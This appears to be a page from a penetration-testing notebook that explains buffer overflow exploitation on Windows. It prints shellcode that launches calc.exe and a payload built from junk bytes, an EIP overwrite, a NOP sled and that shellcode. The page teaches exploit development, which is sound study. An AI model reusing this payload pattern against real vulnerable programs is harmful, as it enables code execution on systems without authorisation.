<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Execute Shellcode</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Execute Shellcode</h1><br/>In the chapter below about the <a href="Home--Penetration_Test_Methodology--System_Security_(Windows_&_Linux)--Shellcoding.html">Shellcode</a> we can know more about it<br />Shellcode, this is the code that we want execute on the target machine if the Buffer Overflow works<br /><br /><strong><h3>Example calculator</h3></strong><br />We can find many Shellcode online, the Shellcode to execute the calculator of Windows(calc.exe) is this one:<br /><div class="codebox"><pre><span style="color:#3ad900;font-weight:400">&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7&quot;</span></pre></div><br /><br />so our payload is reppresented like this:<br /><div class="codebox"><pre>payload = <span style="color:#3ad900;font-weight:400">&quot;\xc3&quot;</span>*22  <span style="color:#0088ff;font-weight:400">#Junk Bytes needed to reach the EIP</span><br />payload+=<span style="color:#3ad900;font-weight:400">&quot;\x91\x8A\x8A\x75&quot;</span>  <span style="color:#0088ff;font-weight:400">#overwrite EIP address with the address of the JMP/CALL ESP</span><br />payload+=<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>     <span style="color:#0088ff;font-weight:400">#these are only NOP instructions</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;</span>  <span style="color:#0088ff;font-weight:400">#Shellcode</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7&quot;</span><span style="color:#ff9d00;font-weight:700">)</span></pre></div><br />The calculator is executed! <br />The Buffer Overflow exploitation works also if we do not debug the program!</div>
</body>
</html>
